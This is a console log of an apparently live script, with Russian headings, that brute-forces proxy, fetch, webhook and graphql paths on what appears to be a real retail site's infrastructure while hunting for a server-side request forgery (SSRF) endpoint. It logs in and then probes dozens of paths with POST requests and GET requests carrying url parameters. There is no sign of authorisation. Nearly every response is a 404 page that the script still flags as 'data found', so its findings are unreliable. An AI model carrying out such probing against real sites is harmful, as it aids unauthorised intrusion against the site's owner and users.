@@ -1,0 +1,1941 @@
+[*] Logging in...
+[+] Logged in
+
+================================================================================
+КРИТИЧЕСКАЯ ЗАДАЧА: НАЙТИ ЭНДПОИНТ КОТОРЫЙ ОТРАЖАЕТ SSRF RESPONSE
+================================================================================
+
+================================================================================
+МЕТОД 1: БРУТФОРС ВСЕХ ВОЗМОЖНЫХ API ПУТЕЙ
+================================================================================
+
+[*] Testing POST /api/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/request
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/url
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/external
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/webhook
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/callback
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/api/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/api/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/api/request
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/image/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/image/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /image/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /proxy/image
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/v1/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/v2/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /v1/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /v2/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /graphql
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /api/graphql
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/graphql
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /admin/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /internal/fetch
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /debug/proxy
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing POST /zootopia-events/api/recently-viewed
+    Status: 400, Length: 261954
+    [!!!] ДАННЫЕ НАЙДЕНЫ!
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+================================================================================
+МЕТОД 2: GET ЗАПРОСЫ С URL В QUERY STRING
+================================================================================
+
+[*] Testing GET /api/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/request?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/url?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/external?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/webhook?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/callback?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/api/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/api/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/api/request?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/image/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/image/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /image/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /proxy/image?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/v1/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/v2/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /v1/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /v2/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /graphql?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /api/graphql?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
